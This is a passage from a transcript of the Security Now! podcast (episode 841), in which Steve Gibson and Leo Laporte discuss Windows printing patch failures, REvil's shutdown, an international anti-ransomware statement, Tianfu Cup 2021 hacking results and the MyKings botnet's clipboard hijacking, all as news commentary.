LEO:  He is the happy-go-lucky, which is amazing given what he knows, Steve Gibson.  He is our security guru here at Security Now!.  You can get copies of this.  I'm going to tell you when we do it so you can watch live if you want.  It's fun to watch live because you can chat along with other people watching live.  We stream it every - right after MacBreak Weekly, which is every Tuesday, usually between 1:30 and 2:00 p.m. Pacific.  That's about 5:00 p.m. Eastern.  That would be 21:00 UTC.



The live streams go on all day and all night at TWiT.tv/live.  If there's not a live show in production, you'll see reruns of live shows and productions so you can, you know, like this whole thing will be repeated later today.  So even if you're not around at that particular time, you can watch.  If you're watching live, chat live.  We have a great IRC chat room, irc.twit.tv, where you can converse with others watching at the same time.



If you want to get a copy of the show, there are a couple of unique versions on Steve's site.  16Kb audio, he's the only one that does that.  And that's for the bandwidth-impaired.  And there's beautiful transcriptions written by Elaine Farris.  He hosts those, as well, at GRC.com.  While you're there, pick up the world's best mass storage maintenance and recovery utility.  That would be SpinRite v6.  Currently 6.1 is on its way, as you heard.  And you will get it automatically if you buy 6.0 now.  You can also participate on the forums in the development of 6.1.  Steve's got some great forums at GRC.com.  Lots of other stuff, too.



We have copies of the show on our website at TWiT.tv/sn for Security Now!.  There's a YouTube channel devoted to Security Now!.  All the videos are up there, all 800 and some.  Actually, we didn't start doing video right away.  So I don't know how many videos.



STEVE:  No.



LEO:  600, something like that.  And you can also subscribe.  Probably that's the thing to do.  If you're really a fan and you know you want every Security Now!, collect all 840.  If you subscribe to the podcast, we'll keep you up to date automatically.  They'll download the minute it's available.



There are lots of different podcast players.  Certainly Apple and Google have theirs.  Pocket Casts is very popular.  If your podcast player supports reviews, do leave us a five-star review.  Let the world know Security Now! exists.  We need to get the word out.  More people ought to listen to the show, obviously.  Steve, we'll see you back here next week.  Good job.



STEVE:  Yay.  Thank you, buddy.



Copyright (c) 2021 by Steve Gibson and Leo Laporte.  SOME RIGHTS RESERVED.  This work is licensed for the good of the Internet Community under the Creative Commons License v2.5.  See the following Web page for details:  https://creativecommons.org/licenses/by-nc-sa/2.5/.






GIBSON RESEARCH CORPORATION		https://www.GRC.com/



SERIES:		Security Now!

EPISODE:	#841

DATE:		October 19, 2021

TITLE:		Minh Duong's Epic Rickroll 

HOSTS:	Steve Gibson & Leo Laporte

SOURCE:	https://media.grc.com/sn/sn-841.mp3

ARCHIVE:	https://www.grc.com/securitynow.htm



DESCRIPTION:  This week we, of course, update on various controversies surrounding Win11 and catch up on the aftermath of last week's Patch Tuesday.  We note that REvil's brief reappearance appears to have ended, perhaps this time forever; and we examine, just for the record, the outcome of the big, virtual, 30-nation anti-ransomware meeting where the invitations for China and Russia were apparently lost in the mail.  We look at the amazing results of this past weekend's Tianfu Cup 2021 hacking competition in China, at the startling success of a prolific botnet's clipboard hijacking module, and at LinkedIn's decision to dramatically pare down its offerings in China.  And then, after quickly sharing Sunday's big news about SpinRite, we're going to take a very fun and detailed look at the sophisticated senior prank orchestrated by Illinois' Minh Duong who miraculously sidestepped his own arrest.



SHOW TEASE:  It's time for Security Now!.  Steve Gibson is here.  REvil may be gone for good.  Steve explains why we might think that.  The results from the Tianfu Cup security competition.  I wonder who gets the benefit of these security flaws?  And then we'll expose, discuss, and break down a very clever senior day prank.  It's all coming up next on Security Now!.



LEO LAPORTE:  This is Security Now! with Steve Gibson, Episode 841, recorded Tuesday, October 19th, 2021:  Minh Duong's Epic Rickroll.



It's time for Security Now!, the show where we cover the latest news in security and privacy, and this guy's the guy.  Looking over the top of his glasses askance at us, it's Steve Gibson from GRC.com.



STEVE GIBSON:  Yo, Leo.



LEO:  How are you, Steve?



STEVE:  Great to be with you again.  I am good.  Lots is going on.  I have some good news to announce about SpinRite later on.  Progress.  But something that you caught wind of during last week's podcast was just - I dug into it further, and it was just too fun.



LEO:  Yeah.



STEVE:  So this week's podcast #841 for October 19th is titled Minh Duong's Epic Rickroll.  This is an Illinois-based high school senior who got an idea...



LEO:  He's actually now at the University of Illinois Urbana.



STEVE:  Yes.  And, well, there's a whole bunch of really cool detail which our particular audience will appreciate, like how he chose to use SSH rather than HTTP and so forth.  We have the details of the hack.



LEO:  Nice.



STEVE:  So we're going to talk about that.  But of course we're going to update first on various ongoing controversy surrounding Windows 11, catch up on the aftermath of last week's Patch Tuesday.  We note that REvil's brief reappearance appears to have ended, perhaps this time forever.



LEO:  Oh.



STEVE:  Yeah.  We'll talk about that.  And we examine, just for the record, the outcome of the big virtual 30-nation anti-ransomware meeting where the invitations for China and Russia appear to have been lost in the mail.  Wonder how that happened?



LEO:  Wonder why?  Hmm.



STEVE:  Hello, why is their rectangle blank on that Zoom call?  Anyway, we're going to look at the amazing results of this past weekend's Tianfu Cup 2021 hacking competition which took place just last Saturday and Sunday in China; at the startling success which has been sort of under the radar until just recently, well, last week, of a prolific botnet's clipboard hijacking module, we'll remind everybody what that's about; and at LinkedIn's decision to dramatically pare down its offerings in China as a result of a sort of a warning slap they got back in March.  And then, after quickly sharing, as I said, Sunday's significant news about SpinRite, we're going to take a very fun and detailed look at the sophisticated senior prank orchestrated by Illinois' Minh Duong, who miraculously sidestepped his own arrest. 



LEO:  Yeah.  I like, by the way, that's a good part of the story, too, yeah.



STEVE:  Yeah.



LEO:  This is going to be fun.  I'm looking forward to it.



STEVE:  Yeah.  And of course we do have also a fun Picture of the Week.  But just came out of the queue because I thought, you know...



LEO:  You get a stack of those by now every week, I bet; right?



STEVE:  It's wonderful, yeah, yeah.



LEO:  All through his Twitter account.  DMs are open at @SGgrc.



STEVE:  Well, this is just one that I got a kick out of.  Someone sent me, apropos of technology and the podcast, this shows a sign somewhere in rural America that has some of the movable letters stuck on it that you see in pre-electronic displays.  Anyway, so this thing probably stands about, I don't know, three or four feet tall.  And it says, "Has anyone tried unplugging the United States and plugging it back in?"



LEO:  Just reboot, please.  We could use a reboot.



STEVE:  Yes.  That is, of course, the time-honored wisdom when something just doesn't work anymore.  Well, when was the last time you rebooted that?  Oh.  Yeah, that's a good idea.



Okay.  So I got a tweet which sort of gave me a platform for something that I did want to follow up on.  This was "hickeyj" tweeted, saying:  "Hi Steve.  Related to your discussions on Windows 11 system requirements, I was interested to see that it was possible to install on" - meaning Windows 11 - "on a 10-year-old PC with a 2nd-gen i5 processor.  Running pretty well and seems to be receiving updates."



So I just wanted to close the loop on that question and note that every report is that all machines, regardless of how they have Win11 installed, are reporting that updates are being received.  And given the number of people who I've seen citing that not receiving updates is a strong reason not to move to Windows 11 without Microsoft's full blessing, it's clear that just the threat of being cut off from the continual IV drip of Windows improvements and corrections serves as a powerful deterrent, exactly as Microsoft knew it would, while they proceed to deliver updates to every instance of Windows 11, as of course they will.  So if anyone's worried, I don't think you need to worry.  On the other hand, I don't think there's, as we've said, and as many people are observing, any great need to make the move unless you just, you know, you like pain.



Okay.  So last week was October's Patch Tuesday, and it was as eventful as most have been recently for Windows.  Threatpost characterized one of last week's updates as:  "A PrintNightmare Fix to Fix the Other PrintNightmare Fix."  And as it turns out, that fix broke other things.  After applying last Tuesday's patches, users and administrators of Windows 10 have started reporting wide-scale network printing problems.  And of course this has now become a monthly ritual; right?  The culprit this time appears to be KB5006670.



Now, different releases of Windows get different cumulative monthly updates.  Windows 11 gets KB5006674.  Windows 8 receives '6714.  And the oldest Windows 10 supported, which is 1909, receives '6667.  But it's '6670, which is used by Windows 10 2004, 20H1 and 21H1, that people are reporting trouble with.  Now, given the nature of the trouble, it's more likely, or I would say I guess more than likely, that all releases are actually seeing the same trouble because this seems to be Windows-wide, and that reports are appearing surrounding these three Win10 editions since they are by far the most prevalent Windows 10, being the most recent.



In any event, after installing this '6670, KB5006670, within Win10 networks, users are reporting that they cannot print to network print servers, with some users reporting a 0x00000709 or "Element not found" errors when attempting to print.  In online forums, Windows admins have been airing their frustration with the continual printing bugs and have come to a unanimous conclusion:  Uninstalling last week's updates solves the problem.  And as we know, ever since July, following the PrintNightmare flaws first becoming public in June, although Microsoft, as we know, was informed of them back in March, Microsoft has been scrambling and releasing a stream of what appear to be half-baked security updates intended to fix the various PrintNightmare vulnerabilities as quickly as they can because these are being exploited in the wild.  And some of them have been in Windows Print Spooler.



After seeing a bit of this and looking into the nature of the trouble, I made the observation on this podcast some time ago that we appeared to be seeing a true collapse of Windows' printing infrastructure because the bad guys had figured out how to leverage Windows' traditional cross-network print driver auto-installation, which provided Windows with some very popular and cool printing features.  Unfortunately, these features had always been exploitable by anyone on the network to elevate their rights and execute their own code.  But no one had, until recently.



Ever since then, Microsoft has been attempting to essentially patch the unpatchable.  It's unpatchable because it's not a bug.  It truly is a feature.  Point and Print is just a feature that Microsoft probably now regrets, at least as it's currently implemented.  So Microsoft has been attempting to change Windows Point and Print features operation.  And while these changes at least somewhat mitigate the vulnerabilities, we've been watching as they have created their own set of new problems for enterprise users.



Imagine being admin of a good-size enterprise whose printing systems keep being broken over and over, month after month.  It would become a bit tiresome after a while.  And I would wager that the people whose reports we're hearing posted or seeing posted are those whose admins haven't yet stopped hoping.  I mean, there must be enterprises where they're just saying, you know, we're going to keep our defenses up for the PrintNightmare problem, but wait until we see a month go by without other enterprises reporting continual problems before we decide to, like, catch up.



Meanwhile, a different issue has beset new Windows 11 users, and guess where it is.  Microsoft has confirmed a new and different printing issue for Windows 11.  It causes printer installations to fail on systems commonly found in enterprise environments.  Microsoft explains that a printer installation might fail when attempted over the network on devices that access printers via print servers using HTTP connections, and that installing printers might also fail when using the Internet Printing Protocol (IPP) in organizations sharing an IPP printer using printer connections.



These problems are said to be specific to Windows 11 because they were fixed in either the September or October updates for the earlier operating systems, which technically predate Windows 11 - except for this October, which update didn't, but did by a week - but not yet for Windows 11.  A fix for this is slated for later this month.  You know, obviously they know how to do it.  It just didn't get into Windows 11 in time.



Last week's release, the good news for Patch Tuesday, it included a fix for CVE-2021 which was numbered 36970.  It's a spoofing vulnerability in, yes, Microsoft Windows Print Spooler, that has a pretty high CVSS score of 8.8.  Chris Morgan, who's a senior cyberthreat intelligence analyst at Digital Shadows, said that the spoofing vulnerability fix Microsoft pushed out last week is meant to fix new problems that previous patches have introduced.



Okay.  Chris said:  "While Microsoft provided a fix in their September 2021 update, the patch resulted in a number of new management problems.  Certain printers required users to repeatedly input their admin credentials every time an application attempted to print or had a client that connected to a print server."  Chris added that:  "Other problems included event logs recording error messages and denying users the ability to perform basic prints.  As a result, many users skipped the update due to its operational impact" - which is putting it kindly - "ultimately leaving the risk posed by PrintNightmare in place," rather than having them fixed.



So it appears that Windows printing remains tangled.  We'll check back next month, see how they're doing.  The best news is that none of this affects typical end users who typically just have local printing environments that have never had any of these problems.  On the other hand, Microsoft's enterprise customers are obviously where they're keeping their focus.



So a critical remote code execution, a baddie, affecting Word, Office, and SharePoint was fixed, also last week.  That's CVE-2021-40486, an RCE which affects, as I said, Word, Office, and some versions of SharePoint Server which can be exploited via the preview pane.  The vulnerability is reportedly not completely new to Microsoft, with several other very similar related CVEs documented earlier this year.  So it sounds as though this might be another of these recent cases of a partial quick fix that didn't repair the underlying problem, which persisted.



The vulnerability has worried security experts because the attack has very low complexity, meaning very easy to do and get done, merely requiring a user to open a specially crafted file either received by email or via a website.  And if from a website, either hosted by the attacker themselves or through a compromised website that accepts or hosts user-provided content.  So if you can get this thing to be shown somehow, that's enough.  An attacker who successfully exploits the vulnerability may use it to perform actions in the context of the current user.  So the code in the opened file would take actions on behalf of the logged-in user under the same permissions as that user.  This doesn't give them admin access.  But as we know, that's where attacks begin, not where they end.



Okay.  So overall there were a total of 74 vulnerabilities of various severities fixed, with one being a true zero-day.  The tech press, again, was reporting that there were four zero-days.  But there were four critical problems, only one of which was known to be actively exploited.  Thus one zero-day.  But that one, tracked as 40449, is an elevation of privilege vulnerability in the Win32k.dll.  So that's in the kernel.  Earlier this year, Kaspersky researchers discovered that an exploit of this vulnerability was being used to elevate privileges and commandeer Windows servers as part of a Chinese-speaking advanced persistent threat campaign from the APT threat actor known as "IronHusky."



The exploit chain was observed to terminate with the installation of a newly discovered Remote Access Trojan (RAT) dubbed "MysterySnail," which put me in mind of those ridiculously named, what were those, vuln something, that was that thing that was spitting out dumb names for vulnerabilities.



LEO:  Yeah, the Vulnyms.



STEVE:  Was it Vulnonyms?



LEO:  Vulnonyms, yeah.  I don't know.



STEVE:  Maybe that's a little too...



LEO:  Risqu?



STEVE:  Risqu sounding.  Anyway, they were being installed on - this MysterySnail was being installed on compromised servers, with the goal of stealing data.  A senior manager of vulnerability and threat research at Qualys said that, if left unpatched:  "MysterySnail" - which is a mystery - "has the potential to collect and exfiltrate system information from compromised hosts, in addition to other malicious actors apparently somehow having the ability to gain complete control over the affected system and launch further attacks."  I think that quote was a little confused because the other malicious actors are probably those who might also use this Win32sys.dll vulnerability, not others who could somehow jump on the, I don't want to say the tail of the MysterySnail.  But there it is.  So even though Microsoft appears to be chasing their tail with printing, other good things are being fixed.  So yay.



In a little bit of ransomware news, REvil may finally actually be gone for good.  The REvil gang has once again shut themselves down for the second time.  But if we're to believe its new leader, this is it.  In a message posted on an underground Russian-language hacking forum, which was translated into English for the rest of us, the group's new leader, who uses the handle 0_neday  which I guess you're supposed to see as Oneday, even though it leads with a zero, so I guess that's supposed to be clever, anyway, we'll call him Oneday  posted that they lost control over their Tor-based domains.  And of course that ain't supposed to happen.



As we know, the group shut down without any notice previously for the first time on July 13th this year, coincident with one of their affiliates having attacked Kaseya's servers over the 4th of July U.S. holiday weekend and hitting thousands of businesses, thus being called the largest set of ransomware attacks in history, which, not surprisingly, drew a great deal of unwanted attention.  Later, we learned that the decision to shut down operations was taken by the group's then-leader known as the four uppercase initials UNKN, I guess thus pronounced "unknown," who took down servers and disappeared.  He absconded with the group's finances, which left them unable to pay many of their affiliates, which were other groups who were helping REvil execute attacks and splitting the profits, as we know.



Okay.  So then, early last month, the group, minus UNKN, made a formal return using the same name REvil.  To prove they were the same group as before, this new REvil incarnation, really just a turned-things-back-on version of the previous one, restored all of their former Tor-hosted portals, such as their victim payment/extortion portal and their data leak site.  As soon as they returned, the group's members began launching new attacks, and we talked about the return of REvil.



But last Sunday, two days ago, in a series of messages spotted by an analyst who's with Recorded Future, the group's new admin, that guy calling himself 0_neday, said that a third party had compromised their Tor-based portal.  He posted, and this is the English translation:  "The server was compromised, and they were looking for me."  He said:  "To be precise, they deleted the path to my hidden service in the torrc file and raised their own so that I would go there."



LEO:  Hmm.



STEVE:  Yeah.



LEO:  Wouldn't they have to have access, physical access to machine, or at least, I mean, to change that rc file they'd have to be in there.



STEVE:  Yes.  Yes.  It's a big deal.  So 0_neday was saying that someone had created a clone of the legitimate REvil Tor backend panel in the hopes of luring him and then catching him.  And that was enough.  Already things were not going well for the REvil gang as they were still dealing with the fallout following their July shutdown and the theft of the affiliate funds.  Several affiliates were still trying to recover funds stolen by the UNKN guy, and the group's developers were also accused of hiding a backdoor inside their code. The backdoor allegedly allowed the REvil admins to provide decryption keys to victims directly, thus cutting the affiliates out of the loop, both for negotiations and payment.



So basically their cred was in trouble.  Since the cybercriminal underworld is primarily driven, such as it is, by reputation and trust - what was that about honor among thieves? - this may have been inevitable, with the writing already being on the wall for what 0_neday decided to do, now declaring that he has shut down the operation permanently, rather than deal with the gang's ever-increasing reputational trouble which probably became unsurvivable.



The Recorded Future analyst who did the decryption of the posting told The Record:  "I really hope we just witnessed an offensive operation by the U.S. government.  That's how you deal with cybercriminals, using their own methods against them.  Release the Hounds."



LEO:  It does sound like it might be law enforcement that was setting up a trap; right?



STEVE:  Yes, yes, yes.  I think, you know, we've seen with things like surprising removals of cryptocurrency from wallets which isn't supposed to be possible, you know, it's certainly not easy.  And I don't think our government would claim to do something that it didn't do.  And the FBI clearly stated that they "recovered" funds that were tied to the Kaseya attacks.  So those were REvil and/or affiliate funds.



LEO:  Good.  I hope it was.  I hope it was, yeah.



STEVE:  Yeah.



LEO:  Be nice to know that we can do something about this stuff.



STEVE:  Yes.  Exactly.  That we're not entirely, well, incapable.  And which brings us perfectly to this next thing I want to talk about, which is this meeting, this virtual 30-country meeting which was held where representatives from the U.S., the EU, and 30 other countries, so 32, have pledged to mitigate the risk of ransomware and harden the financial system from exploitation with the goal of disrupting the ecosystem, calling it, that is, the ransomware attack problem, "an escalating global security threat with serious economic and security consequences."



Now, I'm not a big fan of bureaucracy.  I'm highly skeptical about whether anything can have any measurable effect, though it does sound like the behind-the-scenes sort of stuff we can do might be useful.  But of course we're all living on top of bureaucracies so it has to do something, too.  I wanted to quickly share what was produced and the nature of the saber-rattling.  There were also some interesting bitcoin account transaction statistics that are worth airing. 



So in a statement released last week following the meeting, officials said, and this is the intro:  "From malign operations against local health providers that endanger patient care, to those directed at businesses that limit their ability to provide fuel, groceries, or other goods to the public, ransomware poses a significant risk to critical infrastructure, essential services, public safety, consumer protection and privacy, and economic prosperity."  Right.  Blah, blah, blah.



Okay.  "And to that end, efforts are expected to be made to enhance network resilience by adopting cyber hygiene good practices, such as using strong passwords, securing accounts with multifactor authentication, maintaining periodic offline data backups, keeping software up-to-date, and offering training to prevent clicking suspicious links or opening untrusted documents."  And as we know, none of that's bad, but it's also all already well-established best practice.  Right?  I mean, all of that's what you're supposed to be doing.  Yet apparently it's not helping.



Okay.  So besides promoting incident information-sharing between ransomware victims and relevant law enforcement and cyber emergency response teams - that's the CERTs - the initiative aims to improve mechanisms put in place to effectively respond to such attacks, while also countering the abuse of financial infrastructure for the sake of laundering ransom payments.



Okay.  And again, to me, putting pressure on the payment system  makes some sense if you can actually do it.  The joint bulletin was issued by ministers and representatives of Australia, Brazil, Bulgaria, Canada, the Czech Republic, the Dominican Republic, Estonia, European Union, France, Germany, India, Ireland, Israel, Italy, Japan, Kenya, Lithuania, Mexico, the Netherlands, New Zealand, Nigeria, Poland, the Republic of Korea, Romania, Singapore, South Africa, Sweden, Switzerland, Ukraine, the UAE, the U.K., and the U.S.  Notably absent, as I said, from the list were China and Russia.  And I guess you don't want the fox guarding the chicken coop or the hen house or whatever.



The international counter-ransomware collaboration comes as illicit payments topped nearly $500 million globally in the last two years alone  $400 million in 2020 and $81 million in the first quarter of 2021, so I guess they hadn't had recent accounting for the last half or the last two quarters of 2021  necessitating the payment flows that make the activities profitable are subject to anti-money laundering regulations, and the networks that facilitate these payments are held accountable.



In late September 2021, the U.S. Treasury Department imposed sanctions on Russian cryptocurrency exchange "Suex" for helping threat actors launder transactions from at least eight ransomware variants, marking the first instance of such an action against a virtual currency exchange.  The U.S. government said:  "Treasury will continue to disrupt and hold accountable these ransomware actors and their money laundering networks to reduce the incentive for cybercriminals to continue to conduct these attacks."  And, you know, yay.  But will that have how much effect?  We don't know.



The development also follows an independent report published by the department's Financial Crimes Enforcement Network, that's FinCEN, which potentially tied roughly - now, I'm skeptical about this number, but I'll explain in a second - $5.2 billion worth of outgoing bitcoin transactions to 10 most commonly reported ransomware variants.  Okay, now, there's just no way that 10 most commonly reported ransomware variants made $5.2 billion worth in bitcoin.



But in addition they identified 177 unique wallet addresses used for ransomware-related payments based on an analysis of 2,184 suspicious activity reports (SARs) filed between - and here's the question I have - January 1st, 2011, and June 30, 2021.  Okay, so that's they're saying a 5.2 billion worth of outgoing bitcoin transactions.  But it's spread over a period of the last 10 years.  And I wonder whether the historical or the present value of bitcoin was used when calculating that summary.  As we know, it's worth way more - I don't know if that's sad or not.  But Leo, for us, we have some history.  It's worth way more now than it was back then.



At the same time, the bulk of the high-value transactions have been recent when bitcoin has been pricey.  In the first half of 2021 alone, ransomware-based financial activity is estimated to have extracted at least 590 million for the threat actors, with a mean average total monthly suspicious amount of ransomware transactions pegged at 66.4 million monthly.



LEO:  I wonder, though, where the 5.2 billion number came from.



STEVE:  Yes, and that's my point.



LEO:  That seems like a lot.



STEVE:  I wonder, yes, I wonder if they summed up all of the bitcoin transactions and then multiplied it by today's...



LEO:  Oh, maybe they did, yeah.



STEVE:  ...bitcoin value.



LEO:  That's probably what they did, yeah.



STEVE:  Exactly.  Whereas you know 10 years ago the bad guys would have been immediately taking that money and moving it into their own fiat currency.



LEO:  We also know that these guys move money back and forth to make it appear like more transactions are occurring than actually are and things like that.  It's, you know, it's a longstanding law enforcement tradition.  You stack a hundred bricks of heroin on the table, and you say...



STEVE:  Then turn the cameras on.



LEO:  ... "street value $38 trillion right there.  Right there."  



STEVE:  Yeah.  So anyway, the most...



LEO:  I'm glad they did it.



STEVE:  Yes.  I am, too.  The most commonly reported variants are REvil, of course now we think DOA, or RIP, I guess.  And  that of course was the Sodinokibi software that was really well engineered.  But maybe the software will reappear under a new guise.  I mean, you know, again, we know that there's been this suspicion that ransomware campaigns, or gangs, rebrand themselves and return.  And we've seen clear signs of differently named gangs clearly using ransomware that looked suspiciously similar to previously shut down ware.  So, yeah, I wouldn't be at all surprised if some future version of Sodinokibi returns with some new actor's name on it.  So anyway, the most commonly reported variants are REvil, Conti, DarkSide, Avaddon, and Phobos.  All that we've touched on in the past here.



The Counter-Ransomware Initiative, the CRI, and crying is what people are doing, hopes to drain their funding and take down their operations by disrupting the groups' funding channels.  And again, that seems to be the Achilles heel, to whatever degree there actually is one.  They said:  "We acknowledge that uneven" - this is interesting - "uneven global implementation of the standards of the Financial Action Task Force to virtual assets and virtual asset service providers, creates" - in other words, you can take your money to China or Russia and cash it in there - "creates an environment permissive to jurisdictional arbitrage by malicious actors seeking platforms to move illicit proceeds without being subject to appropriate anti-money laundering and other obligations.



"We are dedicated to enhancing our efforts to disrupt the ransomware business model and associated money-laundering activities, including through ensuring our national AML (Anti-Money Laundering Frameworks) effectively identify and mitigate risks associated with VASPs" - and those are the Virtual Asset Service Providers, oh, we like our acronyms - "and related activities."



Okay.  So the efforts to disrupt ransomware groups' abuse of cryptocurrency will include regulators, financial intelligence units, and law enforcement regulating, supervising, investigating, and taking action against virtual asset exploitation.  And so, yes, we now know without question that there is somewhere, at some one or multiple locations within the U.S. federal government, someone actively tracking the bitcoin blockchain, looking at what the blockchain ledger reports funds having come in and gone out, and then figuring out what it means.  That's happening without question.



And they said:  "We will also seek out ways to cooperate with the virtual asset industry to enhance ransom-related information sharing."  Reading between the lines there, they're going to bring them all into the fold and say, okay, look, guys, we know you're not bad guys, but we need you to help us with these SARs, these Suspicious Activity Reports.  Oh, and the statement noted:  "Financial institutions play an important role in protecting the U.S. financial system from ransomware-related threats through compliance with BSA obligations.  Financial institutions should determine if an SAR (Suspicious Activity Report) filing is required or appropriate when dealing with a ransomware incident, including ransomware-related payments made by financial institutions that are victims of ransomware."



And remember we just talked about last week how that legislation that had easily passed the Senate and was expected to easily cruise through the House and then be signed into law, would require businesses to report the payment of ransom within, was it - something was said.



LEO:  Very quickly, yeah, yeah.



STEVE:  Was it 24 hours, and something where there was a 24 and there was a 72.



LEO:  Right.



STEVE:  You had to report the event within one of those and the payment within another.  But still, so required reporting will be something.  And of course if you're then a financial institution that accepted the payment and didn't file a report, then you'd be on the hook, too.  So basically the idea is by knitting the government's monitoring into these transactions, people are, you know, very much like the IRS, you know, you'd better pay your taxes, or you can be in trouble.  So you'd better file reports or we're going to get you.



So anyway, who knows what'll happen.  We've observed that the ransomware scourge has largely been enabled by the existence of a means of securely transferring payment anonymously and nearly untraceably.  So attacking that payment chain to whatever degree is possible might at least have some hope for success.  But I doubt that telling potential victims to alter their behavior, right - like, oh, don't click those links, we told them already, and they still did - will have any discernible long-term effect.  There are just too many potential fish already in the Internet sea.  So lots of victims and targets.  And Leo, I'm a victim of...



LEO:  Great thirst.



STEVE:  Dehydration.



LEO:  Dehydration.  Have a drink.  Everybody drink when you hear Steve say, "Let's drink."



STEVE:  Well, we have a lot of fun on this podcast taking a look at the hacking competitions that occur periodically...



LEO:  Always enjoy these, yeah.



STEVE:  ...in our industry, yeah.  They are fun.  So just this past weekend, this last Saturday and Sunday, the Tianfu Cup 2021 competition occurred.  In that competition Windows 10, iOS 15, yes, 15, just still got the paint still drying, Google Chrome, Apple Safari, not surprisingly Exchange Server, and Ubuntu 20 were all successfully hacked, among others.  They were broken into and compromised using original, never-before-seen exploits during this just completed 2021 Tianfu Cup.  It's the fourth edition of the international cybersecurity contest being held in Chengdu, China.



The competition's targets included Chrome running on Windows 10 21H1; Apple Safari running on MacBook Pro; Adobe PDF Reader, pick your platform; Docker CE; Ubuntu 20 and CentOS 8; Exchange Server 2019; Windows 10; VMware Workstation; VMware ESXi; Parallels Desktop; iPhone 13 Pro running iOS 15; domestic mobile phones running Android; QEMU VM; the Synology DS220j DiskStation for some reason; and also the ASUS RT-AX56U router.



Our long-time listeners will recall that this Chinese version of Pwn2Own was started three years ago, in 2018, after the Chinese government regulations barred their wonderfully competent and capable homegrown security researchers from participating in international hacking competitions due to national security concerns, as it was said.  I wondered if maybe it was perhaps over worries that they might not choose to return home.  In any event, Chinese security researchers took home over the weekend $1.88 million.



LEO:  Wow.



STEVE:  Yes.



LEO:  Now I know why people participate in these.



STEVE:  Yeah.  After competing and hacking over the past weekend, as I said, the grand winners were researchers from the Chinese security firm Kunlun Lab, who took home $654,500, which was a third of the total purse of 1.88 million.



Okay.  So back in July, the organizers of the competition announced a series of targets, that is, those I just listed, and participants had until last weekend to target and prepare exploits that they would execute on the devices provided by the organizers on the contest's stage.  Each team had three five-minute attempts to run their exploits, and they could register to hack multiple devices if they wished to increase their winnings.  Overall, there were 16 possible targets, and 11 participants mounted successful exploits against 13 of those 16.  That is, successful; right?  Hacked 13 of those 16, with the exception being the three that weren't, that Synology DS220j NAS, the Xiaomi 11 smartphone, and an unnamed Chinese electric vehicle which for some reason no one elected to target.  Maybe they just didn't have them or who knows.  Anyway, attacks were successfully mounted against every other target.  



Windows 10.  And I should say not just once, often.  Windows 10 was hacked five times, five different ways.  Uh-huh, yeah.



LEO:  I'm sure once was through the printer; but okay, go ahead.



STEVE:  Boy, yes.  Adobe PDF Reader, four times.  Ubuntu 20, four times.  Parallels VM, thrice.  iOS 15, also three times.  Apple Safari, twice.  Chrome, twice.  That ASUS AX56U router, twice.  Whoops.  I hope it wasn't a remote attack.  Docker CE, once.  VMware ESXi, once.  VMware Workstation, once.  QEMU VM, once.  And Microsoft Exchange Server, once.



Most of the exploits were privilege escalation and remote execution bugs.  In other words, the things an attacker would want.  Two of the exploits presented stood out.  The first was a zero-click, zero-interaction, remote code execution attack against a fully patched iOS 15 on the latest iPhone 13.  Yow.  Zero-click, zero interaction.  Complete remote code execution and takeover.



LEO:  Now, I'm just glad they saved it and didn't sell it to the NSO group.  I mean, that's the good news. 



STEVE:  Yes.



LEO:  I presume this is like Pwn2Own where, if you win, and you use an exploit, you then give it to the company to fix; right?



STEVE:  Yes.



LEO:  Yeah.  So that's good.



STEVE:  Yes.  And since this just happened...



LEO:  They could have made millions from NSO Group.



STEVE:  That's right.  Since this was just Saturday and Sunday, it isn't incorporated in any of our current iOS 15.0.2.



The second was a simple two-step remote - yeah, two-step, do-si-do - remote code execution chain against Chrome, which is something we've not seen in any hacking competition in years.  So there are things that you can get Chrome to do.  And as we know, Chrome's at, what was it, 14, I think?  Or maybe it was a baker's dozen, I don't remember, of problems so far this year in Chrome, zero-days.  But this one was a bad remote code execution that was simple to do.



There were also two competition-related tweets that were noteworthy.  One tweet was:  "The iPhone 13 Pro Safari escaped from prison remotely, and Chian Pangu won the highest single bonus of $300,000 in history for that one."  And again, look at what you get for a highly desirable target with a highly exploitable exploit.



LEO:  An iPhone no-click, I mean, millions and millions; right?  



STEVE:  Yes.



LEO:  I mean, you'd be - a lot of bidders going for that one.  Yeah.  Wow.



STEVE:  Yes.  And second tweet:  "First confirmed entry for day one of Tianfu Cup, Kunlun Lab pwned Google Chrome to get Windows system kernel level privilege with only two bugs.  First time since 2015."  And something interesting about this.  Aside from the competition, many Western eyes were on this year's contest for another reason.  One of the iOS exploits showcased at last year's competition was used in a cyberespionage campaign carried out by the Beijing regime against its Uyghur population.



LEO:  Oh.  Now, even though this is a Chinese competition, I am hoping the Tianfu Cup doesn't supply the CCP with these exploits.  Oh, god.  That would be terrible.  It doesn't.  It can't.



STEVE:  It could be parallel discovery.  But it is the case that an exploit that did appear in last year's competition was being used against the Uyghurs.  So that observation has reinforced the belief among Western security experts that Beijing may have forbidden Chinese security researchers from participating in hacking contests held abroad in order to better harness their exploit-creating capabilities for their own purposes.



LEO:  Yeah, this is held in Chengdu.  



STEVE:  Yeah.



LEO:  Wow.  Yikes.



STEVE:  Yeah.  Okay.  We've talked about clipboard hijacking, the process whereby malware waits patiently in a system in the background, silently pinging the system-wide clipboard, looking for the sudden appearance of a valid cryptocurrency wallet address and, when found, would wait for the user to paste that content into its target app, then replace the pasted contents on the fly with one of its own addresses that it controlled.  In this sneaky way, the unwitting user would be irretrievably sending their cryptocurrency to the hacker's wallet.  But just how much cryptocurrency could such attacks net?  Would you believe, in the jargon of Maxwell Smart, would you believe $24.7 million in Bitcoin, Ether, and Dogecoin?



Okay.  First spotted in 2016, the MyKings botnet, as it's named, or one of its names, has been one of the most sprawling malware operations in recent times.  The gang behind this botnet, also referred to as the Smominru or DarkCloud botnet, same, operates by scanning the Internet for exposed Windows or Linux systems running unpatched software.  Using known exploits for those unpatched vulnerabilities, the MyKings gang infects these servers and then moves laterally inside their networks.  Reports published through the years by Guardicore, Proofpoint, Qihoo 360, VMware's Carbon Black, and Sophos have described MyKings as one of the largest malware botnets that has been created over the past decade, with the number of infected systems sometimes easily totaling more than half a million hacked machines.  



In its early years, the botnet was primarily seen deploying a Monero cryptocurrency miner on infected hosts to directly generate profits for the botnet's operators.  And a January 2018 report by Proofpoint estimated the group's profits at the time at around $3.6 million, based on the Monero funds they had found in some wallets they linked back to the group.  But through the years, the MyKings group operations and malware have evolved from a hack-and-mine operation.  The botnet became a Swiss army knife of nastiness, with all sorts of modules for moving across internal networks, spreading like a worm, and carrying out various attacks.



